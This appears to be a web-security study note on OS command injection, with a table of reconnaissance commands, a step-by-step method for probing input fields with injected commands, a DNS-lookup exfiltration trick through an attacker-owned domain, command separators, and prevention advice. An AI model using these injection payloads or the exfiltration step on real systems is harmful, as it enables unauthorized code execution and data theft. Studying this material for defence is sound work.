## OS command (shell) injection
It is an attack when the attack is able to do a remote code execution (RCE) on the server. This happens when an 
unsanitized input is being sent as an argument to a shell command.

### List of useful commands
|Command | Linux |	Windows |
|---------------------|--------|------|
|Name of current user |	whoami |	whoami |
|Operating system |	uname -a | 	ver|
|Network configuration | ifconfig | ipconfig /all |
|Network connections | netstat -an | netstat -an |
|Running processes | ps -ef| tasklist |
|Localhost ICMP| ping 127.0.0.1 | ping 127.0.0.1

To inline commands in Linux, use ``<injected-command>`` or `$<injected-command>`
### How to check for shell injections
This has to be done against every input field (like SQL injection):
1. Do an `echo` or `whoami` and see if the output is being printed in the response
2. If not printed, then try to trigger a time delay by doing `& ping -c 10 127.0.0.1 &`
3. If the time delay happens, then try to find a file system that you can access and do `& <command-name> > <file-path> &`.
This writes the command results to a file that you can go access
4. You can exfiltrate data by also owning a domain, and sending a `nslookup <command-name>.<domain-name>`. This will do
a DNS Lookup and you can see the results of the command to the domain.

### Command separators
For both Windows and Linux: `&`, `&&`, `|`, `||`
For Linux: `;` or `0x0a` or `\n`

### Prevention
1. Don't call OS commands directly from the application layer.
2. If necessary:
   1. Use the program's inbuilt functions to do it.
   2. Validate the input
   3. DON'T sanitize the input by escaping shell metacharacters. There are ways around it.
